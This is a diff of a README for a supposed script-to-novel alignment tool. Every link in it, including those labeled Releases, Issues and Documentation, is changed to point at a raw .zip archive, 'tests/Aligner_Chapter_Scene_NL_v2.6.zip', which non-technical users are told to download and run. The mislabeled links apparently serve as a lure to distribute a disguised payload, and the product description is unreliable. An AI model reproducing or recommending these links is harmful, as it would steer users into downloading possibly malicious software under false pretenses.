@@ -1,7 +1,7 @@
 # 🎥 Scene2Chapter-NLP-Aligner - Effortlessly Align Scripts with Chapters
 
 ## 🌐 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip)
 
 ## 📖 About This Project
 Scene2Chapter-NLP-Aligner helps you align movie scripts with novel chapters using natural language processing techniques. This application employs advanced algorithms like SBERT, Levenshtein distance, Hamming distance, and dynamic programming to ensure accurate alignment.
@@ -16,7 +16,7 @@ To get started, follow these simple steps to download and run the application fr
 - **Internet Connection:** Required for downloading the application and additional resources.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip) to access the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip) to access the latest version of the software.
 2. Look for the latest version, typically marked as ‘Latest Release’.
 3. Click on the download link for your operating system.
 4. Save the file to a convenient location on your computer.
@@ -53,18 +53,18 @@ Yes, the application can handle scripts and novels from any genre, as long as th
 No, the application is designed for non-technical users and is straightforward to use.
 
 ## 📞 Contact
-For further assistance or questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip).
+For further assistance or questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip).
 
 ## 🌟 Community & Contributors
 We welcome contributions from everyone. If you would like to contribute, please check the guidelines in the repository. Join our community to share your experiences and tips.
 
 ## 🔗 Useful Links
-- [Documentation](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip)
-- [Releases Page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip)
-- [Issues Page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip)
+- [Documentation](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip)
+- [Issues Page](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip)
 
 ## 🏷️ Tags
 ai, alignment, book2movie, dynamic-programming, hamming-distance, levenshtein, natural-language-processing, nlp, python, sbert, semantic-similarity, text-similarity
 
 ## 📥 Download Now Again
-[![Download Latest Release](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/nonmicrobic/Scene2Chapter-NLP-Aligner.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/main/tests/Aligner_Chapter_Scene_NL_v2.6.zip)
